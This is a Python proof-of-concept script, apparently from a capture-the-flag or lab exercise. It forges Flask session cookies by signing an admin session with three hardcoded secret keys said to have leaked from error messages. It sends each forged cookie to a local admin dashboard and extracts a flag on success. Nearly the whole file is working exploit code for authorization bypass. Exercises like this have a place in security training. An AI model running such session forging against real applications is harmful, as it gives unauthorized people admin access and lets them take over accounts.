#!/usr/bin/env python3

"""
POC: Session Forging and Cookie Tampering
Demonstrates the ability to forge Flask session cookies using exposed secrets
"""

import requests
from itsdangerous import URLSafeTimedSerializer

print("=== Session Forging Attack POC ===\n")

# Exposed secret keys from error messages and source code
secrets = {
    "From login error": "SZX7NGzEkbKPXQZcckUc",
    "From logout error": "x7uBZvYSW24Lrn3CVGCn",
    "From attack surface": "BIYQYU@*DG(*!@)BO#F_P"
}

# Session data to forge (admin user)
forged_data = {"user": "admin", "role": "admin"}

print(f"Target Endpoint: /admin/dashboard")
print(f"Required Role: admin")
print(f"Exploit: Session forging with exposed Flask secret key\n")

for source, secret_key in secrets.items():
    print(f"Attempting with secret from: {source}")
    print(f"Secret Key: {secret_key}")
    
    try:
        # Create session serializer with the exposed secret
        serializer = URLSafeTimedSerializer(secret_key)
        forged_token = serializer.dumps(forged_data)
        
        print(f"Forged Token: {forged_token}")
        
        # Test the forged token
        session = requests.Session()
        session.cookies.set('session', forged_token)
        
        response = session.get('http://localhost:5003/admin/dashboard')
        
        if 'Admin Dashboard' in response.text:
            print(f"✓ SUCCESS! Dashboard accessed with forged session!")
            
            # Extract flag if available
            import re
            match = re.search(r'flag="([^"]*)"', response.text)
            if match:
                print(f"✓ FLAG: {match.group(1)}")
            break
        elif response.status_code == 302:
            print(f"✗ Session rejected (HTTP 302 redirect)")
        else:
            print(f"✗ Unexpected response (HTTP {response.status_code})")
            
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print()

print("\nVulnerability Summary:")
print("- Multiple Flask secret keys exposed in error messages")
print("- Secret keys enable session forging attacks")
print("- Authorization can be bypassed with crafted session tokens")

